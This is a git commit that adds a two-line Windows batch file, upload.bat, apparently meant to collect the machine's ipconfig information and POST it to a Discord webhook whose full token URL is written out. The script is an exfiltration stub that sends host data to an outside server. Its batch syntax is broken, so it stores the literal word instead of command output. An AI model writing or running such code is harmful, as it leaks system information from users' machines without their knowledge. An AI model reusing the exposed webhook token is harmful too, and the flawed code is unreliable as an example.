5e5bb1a4b1808db1930d960ec5156b4be8a466ab
GunnarasQuark <152932386+GunnarasQuark@users.noreply.github.com>
2023-12-04 18:31:30 -0500

    Create upload.bat

---
+++ upload.bat
@@ -0,0 +1,2 @@
+set c = ipconfig
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%c\"}" https://discord.com/api/webhooks/1181376934517682208/IRM2kElxjKoooN62UvRVIvTHBMEg8Hs53XQJKXBmeRdBFiQ9DMu-OHFH1xpdP4-ZtTtu
